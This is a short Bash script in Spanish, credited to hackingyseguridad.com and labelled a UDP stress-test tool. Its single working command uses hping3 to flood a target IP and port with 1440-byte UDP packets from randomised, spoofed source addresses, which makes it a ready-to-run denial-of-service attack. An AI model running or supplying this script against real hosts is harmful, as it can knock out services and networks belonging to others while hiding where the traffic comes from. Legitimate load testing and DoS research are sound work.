# !/bin/bash
# Herramienta de test de stress UDP
# (C) hackingyseguridad.com 2017
chmod 777 udpflood2
echo UDP Flood con herramienta hping3
echo "uso: ./udpflood2 IP Puerto_UDP"
echo "Control + C para interrumpir"
hping3 $1 -2 --rand-source -p $2 --flood -d 1440
